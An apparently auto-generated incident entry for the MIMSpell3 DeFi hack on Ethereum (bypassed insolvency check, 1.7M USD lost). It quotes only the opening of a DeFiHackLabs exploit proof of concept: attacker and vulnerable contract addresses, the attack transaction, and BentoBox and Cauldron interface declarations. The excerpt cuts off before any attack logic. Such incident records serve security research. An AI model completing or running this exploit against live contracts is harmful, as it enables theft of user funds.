# [?] MIMSpell3 - Bypassed Insolvency Check

## Summary
Severity: Unknown
Chain: Ethereum
Component: MIMSpell3
Published: 2025-10-04
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2025-10/MIMSpell3_exp.sol
Type: defi-exploit-poc

## Details
Lost: 1.7M USD

```solidity
// SPDX-License-Identifier: UNLICENSED
// @KeyInfo - Total Lost : 1.7M USD
// Attacker : https://etherscan.io/address/0x1aaade3e9062d124b7deb0ed6ddc7055efa7354d
// Attack Contract : https://etherscan.io/address/0xb8e0a4758df2954063ca4ba3d094f2d6eda9b993
// Vulnerable Contract : https://etherscan.io/address/0x46f54d434063e5f1a2b2cc6d9aaa657b1b9ff82c
// Attack Tx : https://etherscan.io/tx/0x842aae91c89a9e5043e64af34f53dc66daf0f033ad8afbf35ef0c93f99a9e5e6

// @Info
// Vulnerable Contract Code : https://etherscan.io/address/0x46f54d434063e5f1a2b2cc6d9aaa657b1b9ff82c#code

// @Analysis
// Post-mortem : N/A
// Twitter Guy : N/A
// Hacking God : N/A
pragma solidity ^0.8.15;

import "../basetest.sol";
import "../interface.sol";

// Interfaces
interface IBentoBox {
    function balanceOf(address token, address user) external view returns (uint256);
    function toAmount(address token, uint256 share, bool roundUp) external view returns (uint256);
    function withdraw(
        address token,
        address from,
        address to,
        uint256 amount,
        uint256 share
    ) external returns (uint256 amountOut, uint256 shareOut);
}

interface ICauldron {
    function cook(
        uint8[] calldata actions,
```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2025-10/MIMSpell3_exp.sol_
